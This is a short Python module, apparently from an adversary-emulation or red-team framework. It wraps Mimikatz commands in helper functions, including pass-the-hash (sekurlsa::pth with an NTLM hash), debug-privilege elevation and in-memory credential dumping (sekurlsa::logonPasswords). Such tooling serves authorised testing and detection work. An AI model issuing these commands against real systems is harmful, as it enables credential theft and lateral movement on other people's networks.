from .command import CommandLine
from typing import Dict


class MimikatzSubcommand(object):
    def __init__(self, argname: str, **kwargs: Dict[str, str]):
        items = []
        for key, val in kwargs.items():
            if " " in val:
                items.append('/{}:\\"{}\\"'.format(key, val))
            else:
                items.append('/{}:{}'.format(key, val))

        if items:
            self.text = '"{} {}"'.format(argname, " ".join(items))
        else:
            self.text = argname


class MimikatzCommand(object):
    def __init__(self, *args: MimikatzSubcommand) -> None:
        if '\\' in args[0].text:
            self.command = CommandLine(['cls'] + [x.text for x in args])
        else:
            self.command = CommandLine([x.text for x in args])


def sekurlsa_pth(user, domain, ntlm, run) -> MimikatzSubcommand:
    return MimikatzSubcommand('sekurlsa::pth', user=user, domain=domain, ntlm=ntlm, run=run)


def privilege_debug() -> MimikatzSubcommand:
    return MimikatzSubcommand('privilege::debug')


def sekurlsa_logonpasswords() -> MimikatzSubcommand:
    return MimikatzSubcommand('sekurlsa::logonPasswords')


def mimi_exit() -> MimikatzSubcommand:
    return MimikatzSubcommand('exit')
